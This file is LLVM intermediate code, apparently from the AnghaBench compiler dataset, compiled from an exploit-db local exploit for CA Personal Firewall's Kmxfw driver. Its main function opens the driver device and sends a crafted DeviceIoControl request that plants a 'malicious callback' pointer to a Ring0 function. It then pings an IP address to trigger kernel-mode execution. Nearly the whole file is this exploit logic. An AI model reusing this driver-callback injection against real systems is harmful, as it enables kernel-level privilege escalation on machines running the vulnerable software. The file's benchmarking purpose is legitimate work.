; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_29069.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_29069.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [7 x i8] c"owned!\00", align 1
@.str.1 = private unnamed_addr constant [31 x i8] c"\0Ausage> exploit.exe  2K or XP\0A\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"2K\00", align 1
@.str.3 = private unnamed_addr constant [9 x i8] c"icmp.dll\00", align 1
@.str.4 = private unnamed_addr constant [14 x i8] c"IcmpSendEcho2\00", align 1
@.str.5 = private unnamed_addr constant [15 x i8] c"IcmpCreateFile\00", align 1
@.str.6 = private unnamed_addr constant [13 x i8] c"iphlpapi.dll\00", align 1
@.str.7 = private unnamed_addr constant [4 x i8] c"cls\00", align 1
@.str.8 = private unnamed_addr constant [30 x i8] c"############################\0A\00", align 1
@.str.9 = private unnamed_addr constant [30 x i8] c"### CA Personal Firewall ###\0A\00", align 1
@.str.10 = private unnamed_addr constant [30 x i8] c"##### - Ring0 Exploit - ####\0A\00", align 1
@.str.11 = private unnamed_addr constant [39 x i8] c"Ruben Santamarta\0Awww.reversemode.com\0A\0A\00", align 1
@.str.12 = private unnamed_addr constant [10 x i8] c"\\\\.\\Kmxfw\00", align 1
@INVALID_HANDLE_VALUE = common dso_local global i64 0, align 8
@.str.13 = private unnamed_addr constant [30 x i8] c"[!] Kmxfw Device Handle [%x]\0A\00", align 1
@.str.14 = private unnamed_addr constant [34 x i8] c"[!] Injecting Malicious Callback\0A\00", align 1
@Ring0Function = common dso_local global i64 0, align 8
@.str.15 = private unnamed_addr constant [48 x i8] c"[!] Pinging google\0A\09->Executing Ring0 Function\0A\00", align 1
@.str.16 = private unnamed_addr constant [12 x i8] c"66.102.9.99\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i32*, align 8
  %8 = alloca [4 x i32], align 16
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32 (i64, i32*, i32*, i32*, i32, i8*, i32, i32*, i32*, i32, i32)*, align 8
  %17 = alloca i64 (...)*, align 8
  %18 = alloca i32*, align 8
  %19 = alloca i64, align 8
  %20 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0), i8** %20, align 8
  %21 = load i32, i32* %4, align 4
  %22 = icmp slt i32 %21, 2
  br i1 %22, label %23, label %26

23:                                               ; preds = %2
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.1, i64 0, i64 0))
  %25 = call i32 @exit(i32 1) #3
  unreachable

26:                                               ; preds = %2
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 1
  %29 = load i8*, i8** %28, align 8
  %30 = call i32 @strcmp(i8* %29, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0))
  %31 = icmp ne i32 %30, 0
  br i1 %31, label %39, label %32

32:                                               ; preds = %26
  %33 = call i32 @LoadLibrary(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0))
  %34 = call i64 @GetProcAddress(i32 %33, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0))
  %35 = inttoptr i64 %34 to i32 (i64, i32*, i32*, i32*, i32, i8*, i32, i32*, i32*, i32, i32)*
  store i32 (i64, i32*, i32*, i32*, i32, i8*, i32, i32*, i32*, i32, i32)* %35, i32 (i64, i32*, i32*, i32*, i32, i8*, i32, i32*, i32*, i32, i32)** %16, align 8
  %36 = call i32 @LoadLibrary(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0))
  %37 = call i64 @GetProcAddress(i32 %36, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.5, i64 0, i64 0))
  %38 = inttoptr i64 %37 to i64 (...)*
  store i64 (...)* %38, i64 (...)** %17, align 8
  br label %46

39:                                               ; preds = %26
  %40 = call i32 @LoadLibrary(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.6, i64 0, i64 0))
  %41 = call i64 @GetProcAddress(i32 %40, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0))
  %42 = inttoptr i64 %41 to i32 (i64, i32*, i32*, i32*, i32, i8*, i32, i32*, i32*, i32, i32)*
  store i32 (i64, i32*, i32*, i32*, i32, i8*, i32, i32*, i32*, i32, i32)* %42, i32 (i64, i32*, i32*, i32*, i32, i8*, i32, i32*, i32*, i32, i32)** %16, align 8
  %43 = call i32 @LoadLibrary(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.6, i64 0, i64 0))
  %44 = call i64 @GetProcAddress(i32 %43, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.5, i64 0, i64 0))
  %45 = inttoptr i64 %44 to i64 (...)*
  store i64 (...)* %45, i64 (...)** %17, align 8
  br label %46

46:                                               ; preds = %39, %32
  %47 = call i32 @system(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i64 0, i64 0))
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.8, i64 0, i64 0))
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.9, i64 0, i64 0))
  %50 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.10, i64 0, i64 0))
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.8, i64 0, i64 0))
  %52 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.11, i64 0, i64 0))
  %53 = call i64 @CreateFile(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.12, i64 0, i64 0), i32 0, i32 0, i32* null, i32 3, i32 0, i32 0)
  store i64 %53, i64* %15, align 8
  %54 = load i64, i64* %15, align 8
  %55 = load i64, i64* @INVALID_HANDLE_VALUE, align 8
  %56 = icmp eq i64 %54, %55
  br i1 %56, label %57, label %59

57:                                               ; preds = %46
  %58 = call i32 (...) @ShowError()
  br label %59

59:                                               ; preds = %57, %46
  %60 = load i64, i64* %15, align 8
  %61 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.13, i64 0, i64 0), i64 %60)
  store i32 68, i32* %10, align 4
  %62 = load i32, i32* %10, align 4
  %63 = call i64 @malloc(i32 %62)
  %64 = inttoptr i64 %63 to i32*
  store i32* %64, i32** %6, align 8
  store i32 -2063597548, i32* %9, align 4
  %65 = load i32, i32* %9, align 4
  %66 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.14, i64 0, i64 0), i32 %65)
  %67 = getelementptr inbounds [4 x i32], [4 x i32]* %8, i64 0, i64 0
  store i32 0, i32* %67, align 16
  %68 = load i64, i64* @Ring0Function, align 8
  %69 = trunc i64 %68 to i32
  %70 = getelementptr inbounds [4 x i32], [4 x i32]* %8, i64 0, i64 1
  store i32 %69, i32* %70, align 4
  %71 = getelementptr inbounds [4 x i32], [4 x i32]* %8, i64 0, i64 2
  store i32 0, i32* %71, align 8
  %72 = getelementptr inbounds [4 x i32], [4 x i32]* %8, i64 0, i64 0
  %73 = ptrtoint i32* %72 to i32
  %74 = load i32*, i32** %6, align 8
  %75 = getelementptr inbounds i32, i32* %74, i64 0
  store i32 %73, i32* %75, align 4
  %76 = getelementptr inbounds [4 x i32], [4 x i32]* %8, i64 0, i64 0
  %77 = ptrtoint i32* %76 to i32
  %78 = load i32*, i32** %6, align 8
  %79 = getelementptr inbounds i32, i32* %78, i64 1
  store i32 %77, i32* %79, align 4
  %80 = getelementptr inbounds [4 x i32], [4 x i32]* %8, i64 0, i64 0
  %81 = ptrtoint i32* %80 to i32
  %82 = load i32*, i32** %6, align 8
  %83 = getelementptr inbounds i32, i32* %82, i64 2
  store i32 %81, i32* %83, align 4
  %84 = load i64, i64* %15, align 8
  %85 = load i32, i32* %9, align 4
  %86 = load i32*, i32** %6, align 8
  %87 = load i32*, i32** %6, align 8
  %88 = call i32 @DeviceIoControl(i64 %84, i32 %85, i32* %86, i32 16, i32* %87, i32 68, i32* %12, i32* null)
  %89 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.15, i64 0, i64 0))
  %90 = load i64 (...)*, i64 (...)** %17, align 8
  %91 = call i64 (...) %90()
  store i64 %91, i64* %19, align 8
  %92 = call i64 @malloc(i32 12)
  %93 = inttoptr i64 %92 to i32*
  store i32* %93, i32** %18, align 8
  %94 = load i32 (i64, i32*, i32*, i32*, i32, i8*, i32, i32*, i32*, i32, i32)*, i32 (i64, i32*, i32*, i32*, i32, i8*, i32, i32*, i32*, i32, i32)** %16, align 8
  %95 = load i64, i64* %19, align 8
  %96 = call i32 @inet_addr(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.16, i64 0, i64 0))
  %97 = load i8*, i8** %20, align 8
  %98 = load i32*, i32** %18, align 8
  %99 = call i32 %94(i64 %95, i32* null, i32* null, i32* null, i32 %96, i8* %97, i32 8, i32* null, i32* %98, i32 68, i32 1000)
  %100 = load i32, i32* %3, align 4
  ret i32 %100
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @strcmp(i8*, i8*) #1

declare dso_local i64 @GetProcAddress(i32, i8*) #1

declare dso_local i32 @LoadLibrary(i8*) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i64 @CreateFile(i8*, i32, i32, i32*, i32, i32, i32) #1

declare dso_local i32 @ShowError(...) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @DeviceIoControl(i64, i32, i32*, i32, i32*, i32, i32*, i32*) #1

declare dso_local i32 @inet_addr(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
